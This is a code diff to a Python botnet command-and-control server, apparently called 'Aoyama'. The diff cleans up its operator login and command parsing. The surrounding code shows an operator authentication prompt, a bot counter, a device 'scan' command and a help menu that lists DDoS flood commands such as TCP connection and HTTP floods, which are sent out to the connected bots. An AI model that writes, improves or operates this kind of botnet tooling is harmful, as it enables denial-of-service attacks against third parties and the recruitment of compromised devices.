@@ -101,7 +101,6 @@ def showbot():#bot count
 
 def handle_bot(sock,socketList):
 	code = len(socketList) + 1
-	id_list.append(str(code))
 	while True:
 		try:
 			sock.settimeout(1)
@@ -157,9 +156,9 @@ def Commander(sock):#cnc server
 	so = sock
 	try:
 		sock.send("Username:".encode())
-		name = sock.recv(1024).decode()
+		name = sock.recv(1024).decode().strip()
 		sock.send("Password:".encode())
-		passwd = sock.recv(1024).decode()
+		passwd = sock.recv(1024).decode().strip()
 	except:
 		print("// Someone try to break the server down in progress //")
 		return
@@ -169,7 +168,7 @@ def Commander(sock):#cnc server
 		tmp2 = x.split()
 		#print(tmp2[0])#debug
 		#print(tmp2[1])#
-		if tmp2[0]+"\r\n" == name and tmp2[1]+"\r\n" == passwd:
+		if tmp2[0] == name and tmp2[1] == passwd:
 			print("Commander here: "+tmp2[0])
 			corret=1
 	if corret != 1:
@@ -218,17 +217,17 @@ def Commander(sock):#cnc server
 
 	while True:
 		#print ("==> Python3 C&C server <==")
-		sock.send((str(name.strip("\r\n"))+'@Aoyama:').encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
-		cmd_str = sock.recv(1024).decode()
+		sock.send((str(name)+'@Aoyama:').encode())#if u run this on windows, it may has some bug, idk why so,i use linux.
+		cmd_str = sock.recv(1024).decode().strip()
 		if len(cmd_str):
 			if cmd_str[0] == '!':
 				sendCmd(cmd_str)
 				#sock.send(str(count)+"bots exec the command\r\n".encode())
-			if cmd_str == 'scan' or cmd_str == 'scan\r\n':
+			if cmd_str == 'scan':
 				scan_device()
 			#if cmd_str == 'shell' or cmd_str == 'shell\r\n': haven't finished
 				#shell_exec()
-			if cmd_str == '?' or cmd_str == 'help' or cmd_str == '?\r\n' or cmd_str == 'help\r\n':
+			if cmd_str == '?' or cmd_str == 'help':
 				sock.send('\r\n#-- Commands --#\r\n'.encode())
 				sock.send('  CC   Flood: !cc   host port threads\r\n'.encode())         #tcp connection flood
 				sock.send('  HTTP Flood: !http host port threads path\r\n'.encode())	#http flood
@@ -243,16 +242,16 @@ def Commander(sock):#cnc server
 				sock.send('    exit     : exit the server\r\n'.encode())
 				sock.send('    shutdown : shutdown the server\r\n'.encode())
 				sock.send('=============================================================\r\n'.encode())
-			if cmd_str == 'bots' or cmd_str == 'bots\r\n':
+			if cmd_str == 'bots':
 				sock.send(("Nodes:"+str(len(socketList))+"\r\n").encode())
-			if cmd_str == 'clear' or cmd_str == 'clear\r\n':
+			if cmd_str == 'clear':
 				sock.send("\033[2J\033[1H".encode())
 				sock.send('        d8888                                              \r\n       d88888                                              \r\n      d88P888                                              \r\n     d88P 888 .d88b. 888  888 8888b. 88888b.d88b.  8888b.  \r\n    d88P  888d88""88b888  888    "88b888 "888 "88b    "88b \r\n   d88P   888888  888888  888.d888888888  888  888.d888888 \r\n  d8888888888Y88..88PY88b 888888  888888  888  888888  888 \r\n d88P     888 "Y88P"  "Y88888"Y888888888  888  888"Y888888 \r\n                          888                              \r\n                     Y8b d88P                              \r\n                      "Y88P"                               \r\n'.encode())
-			if cmd_str == 'exit' or cmd_str == 'exit\r\n':
+			if cmd_str == 'exit':
 				sock.send(('Bye, '+str(name.strip("\r\n"))+'\033[0m\r\n').encode())
 				sock.close()
 				break
-			if cmd_str == 'shutdown' or cmd_str == 'shutdown\r\n':#shutdown function
+			if cmd_str == 'shutdown':
 				sock.send('Shutdown\r\n'.encode())
 				sock.close()
 				print("shutdown from remote command")
